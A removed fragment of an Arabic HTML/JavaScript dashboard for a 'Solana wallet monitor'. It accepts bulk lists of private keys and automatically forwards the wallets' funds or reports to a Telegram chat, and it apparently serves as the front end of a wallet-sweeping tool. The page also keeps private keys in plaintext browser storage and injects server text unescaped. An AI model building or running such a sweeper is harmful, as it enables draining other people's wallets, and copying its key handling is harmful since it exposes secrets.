-        .gear-btn{position:fixed;top:16px;left:16px;width:42px;height:42px;border-radius:50%;border:2px solid rgba(255,255,255,0.6);background:rgba(102,126,234,0.85);color:#fff;font-size:20px;cursor:pointer;display:-webkit-inline-flex;display:inline-flex;-webkit-align-items:center;align-items:center;-webkit-justify-content:center;justify-content:center;transition:transform .3s ease,background .3s ease;z-index:200;line-height:1;outline:none;-webkit-appearance:none;appearance:none;padding:0;box-shadow:0 2px 8px rgba(0,0,0,0.25)}
-        .gear-btn:hover{background:rgba(118,75,162,0.95);transform:rotate(30deg)}
-        .gear-btn.active{background:rgba(118,75,162,1);transform:rotate(60deg)}
-        #modeIndicator{position:fixed;top:62px;left:8px;width:58px;text-align:center;font-size:10px;font-weight:700;color:#fff;background:rgba(0,0,0,0.38);border-radius:6px;padding:2px 4px;pointer-events:none;z-index:201;letter-spacing:.3px}
-        .settings-panel{position:fixed;top:90px;left:20px;width:300px;background:#fff;border-radius:14px;box-shadow:0 8px 32px rgba(0,0,0,0.22);z-index:9999;border:1px solid #dde}
-        .settings-panel-header{background:linear-gradient(45deg,#667eea,#764ba2);color:#fff;padding:11px 16px;font-weight:700;font-size:14px;display:-webkit-flex;display:flex;-webkit-align-items:center;align-items:center;gap:8px;border-radius:13px 13px 0 0}
-        .sp-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;align-items:start;padding:14px 16px}
-        @media(max-width:600px){.sp-grid{grid-template-columns:1fr}}
-        .sp-label{font-weight:700;color:#495057;font-size:12px;margin-bottom:6px;display:block}
-        .sp-row{display:flex;gap:6px}
-        .sp-opt{flex:1;padding:9px 6px;border:2px solid #dee2e6;border-radius:8px;cursor:pointer;text-align:center;font-weight:700;font-size:12px;background:#fff;color:#495057;font-family:inherit;-webkit-appearance:none;appearance:none;transition:border-color .15s,background .15s,color .15s}
-        .sp-opt:hover{border-color:#aaa;background:#f8f9fa}
-        .sp-opt.selected{border-color:#28a745!important;background:#d4edda!important;color:#155724!important}
-        .sp-input{width:100%;padding:8px;border:2px solid #dee2e6;border-radius:8px;font-size:12px;direction:ltr;box-sizing:border-box;margin-top:6px}
-    </style>
-</head>
-<body>
-<div class="container">
-    <div class="header">
-        <button class="gear-btn" id="gearBtn" title="الإعدادات" onclick="(function(b){var p=document.getElementById('settingsPanel');if(!p)return;var v=p.style.display==='block';p.style.display=v?'none':'block';b.classList.toggle('active',!v);})(this)">⚙️</button>
-        <div id="modeIndicator">💸 Main</div>
-        <h1>🔥 مراقب محافظ Solana</h1>
-        <p>مراقبة وتحويل الأموال تلقائياً — موزّع على عمال متوازيين</p>
-        <p class="sub">⚡ 2 vCPU / 4 GB RAM | UV_THREADPOOL=8 | UptimeRobot نشط</p>
-
-    </div>
-
-    <div class="main-content">
-        <div class="left-panel">
-            <div class="stats">
-                <div class="stat-card"><div class="stat-value" id="walletCount">0</div><div class="stat-label">المحافظ الكلية</div></div>
-                <div class="stat-card"><div class="stat-value" id="activeCount">0</div><div class="stat-label">النشطة</div></div>
-                <div class="stat-card"><div class="stat-value" id="workerCount">0</div><div class="stat-label">العمال</div></div>
-                <div class="stat-card"><div class="stat-value" id="errorCount">0</div><div class="stat-label">الأخطاء</div></div>
-            </div>
-
-            <div class="card">
-                <h2>📝 إضافة محافظ للمراقبة</h2>
-                <form id="addForm">
-                    <div class="form-group">
-                        <label>المفاتيح الخاصة (كل مفتاح في سطر منفصل):</label>
-                        <textarea id="privateKeys" placeholder="ضع المفاتيح الخاصة هنا&#10;كل مفتاح في سطر منفصل&#10;سيتم توزيعها تلقائياً على العمال"></textarea>
-                    </div>
-                    <div class="form-group">
-                        <label>أو ارفع ملف .txt يحتوي على المفاتيح:</label>
-                        <div class="file-upload-area" id="fileUploadArea">
-                            <input type="file" id="fileInput" accept=".txt,text/plain">
-                            <span id="fileName" style="margin-right:10px;color:#6c757d;font-size:14px"></span>
-                        </div>
-                    </div>
-                    <button type="submit" class="btn" id="addBtn">إضافة المحافظ وتوزيعها</button>
-                </form>
-            </div>
-
-            <div class="card">
-                <h2>📊 حالة المحافظ</h2>
-                <button type="button" class="btn secondary" id="statusBtn">عرض الحالة</button>
-                <div class="status-display" id="statusDisplay"></div>
-            </div>
-
-            <div class="card">
-                <h2 id="toggleTitle">⏹️ إيقاف المراقبة</h2>
-                <button type="button" class="btn danger" id="toggleBtn">إيقاف جميع المحافظ</button>
-            </div>
-        </div>
-
-        <div class="right-panel">
-            <div class="card">
-                <h2>🔔 الإشعارات المباشرة</h2>
-                <div class="notifications" id="notifications">
-                    <div class="notification info"><div>مرحباً بك في مراقب محافظ Solana الموزّع!</div></div>
-                </div>
-            </div>
-        </div>
-    </div>
-</div>
-
-<!-- قائمة الإعدادات المنسدلة -->
-<div id="settingsPanel" style="display:none;position:fixed;top:90px;left:20px;width:290px;background:#fff;border-radius:14px;box-shadow:0 8px 32px rgba(0,0,0,0.22);z-index:9999;border:1px solid #dde;overflow:hidden">
-    <div style="background:linear-gradient(45deg,#667eea,#764ba2);color:#fff;padding:11px 16px;font-weight:700;font-size:14px">⚙️ الإعدادات</div>
-
-    <!-- وضع التشغيل -->
-    <div style="padding:12px 14px 8px">
-        <div style="font-size:12px;font-weight:700;color:#495057;margin-bottom:7px">🔧 وضع التشغيل</div>
-        <div style="display:flex;gap:6px">
-            <button type="button" id="btn-forward"  class="sp-opt" onclick="setMode('forward')">💸 إرسال</button>
-            <button type="button" id="btn-telegram" class="sp-opt" onclick="setMode('telegram')">📨 تلجرام</button>
-        </div>
-        <div id="chatGroup" style="display:none;margin-top:8px">
-            <div style="font-size:11px;font-weight:700;color:#495057;margin-bottom:4px">🆔 Telegram Chat ID</div>
-            <input type="text" id="sp-chatId" placeholder="-100xxxxxxxxxx" class="sp-input"
-                   oninput="currentSettings.chatId=this.value.trim();saveSettings(currentSettings)">
-        </div>
-    </div>
-
-    <div style="height:1px;background:#f0f0f0;margin:0 14px"></div>
-
-    <!-- الشبكة -->
-    <div style="padding:8px 14px 4px">
-        <div style="font-size:12px;font-weight:700;color:#495057;margin-bottom:7px">🌐 الشبكة</div>
-        <div style="display:flex;gap:6px">
-            <button type="button" id="btn-mainnet" class="sp-opt" onclick="setNetwork('mainnet')">🟠 Mainnet</button>
-            <button type="button" id="btn-devnet"  class="sp-opt" onclick="setNetwork('devnet')">🟣 Devnet</button>
-        </div>
-    </div>
-
-    <div style="height:1px;background:#f0f0f0;margin:8px 14px 0"></div>
-
-    <!-- تطبيق -->
-    <div style="padding:10px 14px 14px">
-        <button type="button" id="applySettingsBtn" onclick="applyCurrentSettings()" style="width:100%;padding:10px;border:none;border-radius:8px;background:linear-gradient(45deg,#667eea,#764ba2);color:#fff;font-weight:700;font-size:12px;cursor:pointer;font-family:inherit">⚡ حفظ وتطبيق الإعدادات</button>
-        <div style="font-size:10px;color:#888;text-align:center;margin-top:5px">تُحفظ قبل الإضافة • تُطبَّق فوراً على المراقبة الجارية</div>
-    </div>
-</div>
-
-<script>
-    const SK_KEYS    = 'solana_monitor_keys';
-    const SK_STATE   = 'solana_monitor_state';
-    const SK_SETTINGS = 'solana_monitor_settings';
-
-    const saveKeys     = k => localStorage.setItem(SK_KEYS, k);
-    const loadKeys     = () => localStorage.getItem(SK_KEYS) || '';
-    const saveState    = v => localStorage.setItem(SK_STATE, v ? '1' : '0');
-    const loadState    = () => localStorage.getItem(SK_STATE) === '1';
-    const saveSettings = s => { try { localStorage.setItem(SK_SETTINGS, JSON.stringify(s)); } catch(_) {} };
-    const loadSettings = () => { try { return JSON.parse(localStorage.getItem(SK_SETTINGS) || '{}'); } catch(_) { return {}; } };
-
-    // ── إدارة الإعدادات ──────────────────────────────────────────────────────
-    let currentSettings = Object.assign({ mode: 'forward', network: 'mainnet', chatId: '' }, loadSettings());
-
-    // ── تحديث مؤشر الوضع الصغير تحت زر الترس ──────────────────────────────
-    function updateModeIndicator() {
-        var el = document.getElementById('modeIndicator');
-        if (!el) return;
-        el.textContent = (currentSettings.mode === 'telegram' ? '📨' : '💸') + ' ' +
-                         (currentSettings.network === 'devnet' ? 'Dev' : 'Main');
-    }
-
-    // ── تحديد/إلغاء تحديد زر بـ class صريحة ───────────────────────────────
-    function markBtn(id, active) {
-        var el = document.getElementById(id);
-        if (!el) return;
-        if (active) {
-            el.classList.add('selected');
-        } else {
-            el.classList.remove('selected');
-        }
-    }
-
-    // ── تحديد وضع التشغيل (مجموعة مستقلة) ──────────────────────────────────
-    function setMode(mode) {
-        currentSettings.mode = mode;
-        saveSettings(currentSettings);
-        markBtn('btn-forward',  mode === 'forward');
-        markBtn('btn-telegram', mode === 'telegram');
-        document.getElementById('chatGroup').style.display = mode === 'telegram' ? 'block' : 'none';
-        updateModeIndicator();
-    }
-
-    // ── تحديد الشبكة (مجموعة مستقلة) ───────────────────────────────────────
-    function setNetwork(network) {
-        currentSettings.network = network;
-        saveSettings(currentSettings);
-        markBtn('btn-mainnet', network === 'mainnet');
-        markBtn('btn-devnet',  network === 'devnet');
-        updateModeIndicator();
-    }
-
-    // ── حفظ وتطبيق الإعدادات ────────────────────────────────────────────────
-    // • قبل إضافة المحافظ: تُحفظ محلياً وتُستخدم تلقائياً عند الإضافة
-    // • بعد إضافة المحافظ: تُطبَّق على المراقبة الجارية دون إعادة تحميل
-    //   (تغيير الشبكة أثناء المراقبة يُعيد التحميل تلقائياً في الخلفية)
-    async function applyCurrentSettings() {
-        if (currentSettings.mode === 'telegram' && !currentSettings.chatId.trim()) {
-            alert('⚠️ الرجاء إدخال Telegram Chat ID قبل الحفظ.'); return;
-        }
-        // حفظ محلي دائماً (يُستخدم عند إضافة المحافظ لاحقاً)
-        saveSettings(currentSettings);
-        updateModeIndicator();
-
-        var btn = document.getElementById('applySettingsBtn');
-        if (btn) { btn.textContent = '⏳ جاري الحفظ...'; btn.disabled = true; }
-        try {
-            // إذا كانت المراقبة جارية → طبّق مباشرة على السيرفر
-            if (loadState()) {
-                var r = await fetch('/api/update-settings', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ settings: currentSettings })
-                }).then(function(res) { return res.json(); });
-                if (r && r.success) {
-                    await loadNotifications();
-                    if (r.reload) {
-                        // تغيير شبكة → إعادة تحميل في الخلفية
-                        alert('🔄 ' + r.message);
-                    } else {
-                        alert('✅ ' + r.message);
-                    }
-                } else if (r) { alert('خطأ: ' + r.message); }
-            } else {
-                // لا مراقبة جارية — الإعدادات محفوظة وستُطبَّق عند إضافة المحافظ
-                alert('✅ الإعدادات حُفِظت وستُطبَّق عند إضافة المحافظ.');
-            }
-        } catch(e) { alert('خطأ: ' + e.message); }
-        finally { if (btn) { btn.textContent = '⚡ حفظ وتطبيق الإعدادات'; btn.disabled = false; } }
-    }
-
-    // ── تهيئة لوحة الإعدادات ────────────────────────────────────────────────
-    function initSettingsUI() {
-        var ci = document.getElementById('sp-chatId');
-        if (ci) ci.value = currentSettings.chatId;
-
-        // إغلاق اللوحة عند النقر خارجها — closest يتجنب مشكلة العقد المنفصلة
-        document.addEventListener('click', function(e) {
-            var panel = document.getElementById('settingsPanel');
-            if (panel.style.display !== 'block') return;
-            if (!e.target.closest('#settingsPanel, #gearBtn')) {
-                panel.style.display = 'none';
-                document.getElementById('gearBtn').classList.remove('active');
-            }
-        });
-
-        // تطبيق الحالة المحفوظة
-        setMode(currentSettings.mode);
-        setNetwork(currentSettings.network);
-    }
-
-    function setUI(isMonitoring) {
-        const btn   = document.getElementById('toggleBtn');
-        const title = document.getElementById('toggleTitle');
-        btn.textContent   = isMonitoring ? 'إيقاف جميع المحافظ' : 'استئناف المراقبة';
-        btn.className     = isMonitoring ? 'btn danger' : 'btn';
-        title.textContent = isMonitoring ? '⏹️ إيقاف المراقبة' : '▶️ استئناف المراقبة';
-    }
-
-    async function loadNotifications() {
-        try {
-            const notifs = await (await fetch('/api/notifications')).json();
-            const el = document.getElementById('notifications');
-            el.innerHTML = notifs.length
-                ? notifs.map(n => '<div class="notification '+n.type+'"><div>'+n.message+'</div><div class="timestamp">'+new Date(n.timestamp).toLocaleString('ar-EG')+'</div></div>').join('')
-                : '<div class="notification info">لا توجد إشعارات حالياً</div>';
-            updateStats();
-        } catch(e) { console.error(e); }
-    }
-
-    async function updateStats() {
-        try {
-            const s = await (await fetch('/api/state')).json();
-            document.getElementById('walletCount').textContent = s.totalWallets  || 0;
-            document.getElementById('activeCount').textContent = s.totalActive   || 0;
-            document.getElementById('workerCount').textContent = s.workers       || 0;
-            document.getElementById('errorCount').textContent  = s.totalFailed   || 0;
-        } catch(e) {}
-    }
-
-    async function addWallets(keys) {
-        if (currentSettings.mode === 'telegram' && !currentSettings.chatId.trim()) {
-            return { success: false, message: '⚠️ الرجاء إدخال Telegram Chat ID في الإعدادات (⚙️) قبل المتابعة.' };
-        }
-        const settings   = { mode: currentSettings.mode, network: currentSettings.network, chatId: currentSettings.chatId };
-        return (await fetch('/api/add-wallets', {
-            method:  'POST',
-            headers: {'Content-Type': 'application/json'},
-            body:    JSON.stringify({ privateKeys: keys, settings })
-        })).json();
-    }
-
-    // ── رفع ملف .txt ────────────────────────────────────────────────────────
-    document.getElementById('fileInput').addEventListener('change', function(e) {
-        const file = e.target.files[0];
-        if (!file) return;
-
-        document.getElementById('fileName').textContent = '⏳ جاري قراءة الملف: ' + file.name;
-
-        const reader = new FileReader();
-
-        reader.onerror = function() {
-            document.getElementById('fileName').textContent = '❌ فشل قراءة الملف';
-            alert('فشل في قراءة الملف، حاول مجدداً');
-        };
-
-        reader.onload = async function(ev) {
-            const content = ev.target.result || '';
-            const lines = content.split(/[\r\n]+/);
-            const newKeys = lines.map(k => k.trim()).filter(k => k.length > 30).join('\n');
-
-            if (!newKeys) {
-                document.getElementById('fileName').textContent = '⚠️ لا توجد مفاتيح صالحة في: ' + file.name;
-                alert('لم يُعثر على مفاتيح صالحة في الملف\n\nتأكد أن كل سطر يحتوي على مفتاح خاص بتنسيق base58');
-                return;
-            }
-
-            const keyCount = newKeys.split('\n').length;
-            document.getElementById('fileName').textContent = '✅ ' + file.name + ' — ' + keyCount + ' مفتاح';
-
-            const current = document.getElementById('privateKeys').value.trim();
-            document.getElementById('privateKeys').value = current ? current + '\n' + newKeys : newKeys;
-
-            // إرسال تلقائي بعد قراءة الملف
-            const btn = document.getElementById('addBtn');
-            btn.textContent = 'جاري الإضافة والتوزيع...'; btn.disabled = true;
-            try {
-                const keys = document.getElementById('privateKeys').value;
-                const r = await addWallets(keys);
-                if (r.success) {
-                    saveKeys(keys.trim()); saveState(true); setUI(true);
-                    document.getElementById('privateKeys').value = '';
-                    await loadNotifications();
-                    alert(r.message);
-                } else {
-                    alert('خطأ: ' + r.message);
-                }
-            } catch(err) {
-                alert('خطأ في الاتصال بالسيرفر: ' + err.message);
-            } finally {
-                btn.textContent = 'إضافة المحافظ وتوزيعها'; btn.disabled = false;
-            }
-        };
-
-        reader.readAsText(file);
-    });
-
-    document.getElementById('addForm').addEventListener('submit', async e => {
-        e.preventDefault();
-        const btn  = document.getElementById('addBtn');
-        const keys = document.getElementById('privateKeys').value;
-        if (!keys.trim()) { alert('الرجاء إدخال المفاتيح الخاصة'); return; }
-        btn.textContent = 'جاري الإضافة والتوزيع...'; btn.disabled = true;
-        try {
-            const r = await addWallets(keys);
-            if (r.success) {
-                saveKeys(keys.trim()); saveState(true); setUI(true);
-                document.getElementById('privateKeys').value = '';
-                await loadNotifications();
-                alert(r.message);
-            } else { alert('خطأ: ' + r.message); }
-        } catch(err) { alert('خطأ: ' + err.message); }
-        finally { btn.textContent = 'إضافة المحافظ وتوزيعها'; btn.disabled = false; }
-    });
-
-    document.getElementById('statusBtn').addEventListener('click', async () => {
-        const btn = document.getElementById('statusBtn');
-        btn.textContent = 'جاري التحديث...'; btn.disabled = true;
-        try {
-            const s = await (await fetch('/api/status')).json();
-            document.getElementById('statusDisplay').textContent = s.message;
-        } catch(e) { document.getElementById('statusDisplay').textContent = 'خطأ: ' + e.message; }
-        finally { btn.textContent = 'عرض الحالة'; btn.disabled = false; }
-    });
-
-    document.getElementById('toggleBtn').addEventListener('click', async () => {
-        const btn = document.getElementById('toggleBtn');
-        const isStopping = btn.textContent.includes('إيقاف');
-
-        if (isStopping) {
-            if (!confirm('هل أنت متأكد من إيقاف مراقبة جميع المحافظ؟')) return;
-            btn.textContent = 'جاري الإيقاف...'; btn.disabled = true;
-            try {
-                const r = await (await fetch('/api/stop', {method:'POST'})).json();
-                saveState(false); setUI(false);
-                await loadNotifications(); alert(r.message);
-            } catch(e) { alert('خطأ: ' + e.message); }
-            finally { btn.disabled = false; }
-        } else {
-            const keys = loadKeys();
-            if (!keys) { alert('لا توجد محافظ محفوظة. الرجاء إضافة محافظ أولاً.'); return; }
-            btn.textContent = 'جاري الاستئناف...'; btn.disabled = true;
-            try {
-                const r = await addWallets(keys);
-                if (r.success) { saveState(true); setUI(true); await loadNotifications(); alert(r.message); }
-                else { alert('خطأ: ' + r.message); }
-            } catch(e) { alert('خطأ: ' + e.message); }
-            finally { btn.disabled = false; }
-        }
-    });
-
-    document.addEventListener('DOMContentLoaded', async () => {
-        initSettingsUI();
-        const keys = loadKeys();
-        const was  = loadState();
-
-        try {
-            const serverState = await (await fetch('/api/state')).json();
-            const actuallyMonitoring = serverState.isMonitoring && serverState.totalActive > 0;
-            setUI(actuallyMonitoring);
-            saveState(actuallyMonitoring);
-
-            // تحديث الأرقام فوراً بدون انتظار الـ interval
-            document.getElementById('walletCount').textContent = serverState.totalWallets || 0;
-            document.getElementById('activeCount').textContent = serverState.totalActive  || 0;
-            document.getElementById('workerCount').textContent = serverState.workers      || 0;
-            document.getElementById('errorCount').textContent  = serverState.totalFailed  || 0;
-
-            // استئناف تلقائي
-            if (keys && was && !actuallyMonitoring) {
-                try {
-                    const r = await addWallets(keys);
-                    if (r.success) { setUI(true); saveState(true); await updateStats(); }
-                } catch(e) { console.error('Auto-restore:', e); }
-            }
-        } catch(e) {
-            setUI(keys ? was : false);
-        }
-
-        await loadNotifications();
-        setInterval(loadNotifications, 5000);
-        // تحديث الأرقام بشكل مستقل كل 3 ثوانٍ
-        setInterval(updateStats, 3000);
-
-    });
-</script>
-</body>
-</html>`;
-}
-*/
